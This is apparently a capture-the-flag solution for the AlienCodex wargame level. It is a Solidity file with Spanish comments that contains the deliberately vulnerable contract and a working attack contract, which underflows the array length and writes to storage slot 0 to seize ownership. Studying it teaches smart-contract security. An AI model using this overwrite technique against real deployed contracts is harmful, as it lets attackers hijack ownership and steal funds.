// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../../lib/Ownable.sol";

/* OVERFLOW -> solapar el slot, ya que se puede acceder al slot desde el array */
contract AlienCodexAttack {
    constructor(AlienCodex _alienCodexAddress) public {
        /* slot 0 - owner + bool */
        /* slot 1 - length del array como uint256 */
        /* slot 2 - vacio */

        /* @remind los valores del array se gaurdaran a partir de  */
        /* h -> keccak256(abi.encode(1)); ---> slot -> 80084422859880547211683076133703299733277748156566366325829078699459944778998  */
        /* slot h --> codex[0] */
        /* slot h +1 --> codex[1] */
        /* slot h +2 --> codex[2] */
        /* slot h +3 --> codex[3] */
        /* ... */

        /* Ahora necesitaremos encontrar el valor de slot i que debe de ser el 0 (en el array)
        slot 0 = i + k --> i = 0 - k
        */

        _alienCodexAddress.makeContact();

        /* Aqui, convertimos el length = 0  --en--> length = 2**256 -1  */
        _alienCodexAddress.retract();

        uint k = uint(keccak256(abi.encode(1)));
        uint i = 0 - k;

        bytes32 _addr = bytes32(uint(uint160(msg.sender)));
        _alienCodexAddress.revise(i, _addr);

        require(_alienCodexAddress.owner() == msg.sender, "not hacked");
    }
}

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
